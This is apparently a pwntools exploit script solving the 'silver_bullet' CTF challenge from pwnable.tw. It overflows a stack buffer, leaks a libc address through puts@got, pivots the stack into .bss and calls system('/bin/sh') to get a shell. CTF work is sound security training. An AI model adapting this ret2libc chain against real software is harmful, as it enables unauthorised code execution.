from pwn import *   # pip install pwntools

#r = remote("chall.pwnable.tw", 10103)
r = process("./silver_bullet")
elf = ELF("./silver_bullet")
libc = ELF("./libc_32.so.6")

def create(des):
    r.recvuntil("choice :")
    r.sendline("1")
    r.recvuntil(":")
    r.send(des)
    
def powerup(des):
    r.recvuntil("choice :")
    r.sendline("2")
    r.recvuntil(":")
    r.send(des)

read_int = 0x8048643
puts = 0x80484A8
pop = 0x08048475
leave = 0x080486b5
buf = elf.bss() + 0x300

create("A" * 47)
powerup("\xff") # power = 1

payload = "\xff\xff\xff" # power
payload += p32(buf)      # ebp
# puts(puts@got)
payload += p32(puts)
payload += p32(pop)
payload += p32(0x804AFDC)
# eax = read_int(input) -> read(0, eax, 0x41414141) 
payload += p32(read_int)
payload += p32(0x804864e)
payload += p32(0x41414141)
# migrate
payload += p32(leave)

powerup(payload)    # bof

# kill wolf to return from main()
r.recvuntil("choice :")
r.sendline("3")
r.recvuntil("Oh ! You win !!\n")

libc_base = u32(r.recvline()[:4]) - libc.symbols["puts"]
log.info("libc_base = " + hex(libc_base))

libc_system = libc_base + libc.symbols["system"]
libc_sh = libc_base + next(libc.search("/bin/sh\x00"))

r.sendline(str(buf).ljust(14)) # input for read_int

r.sendline(p32(libc_system) * 2 + p32(libc_sh) * 2 )    # second rop chain

r.interactive()

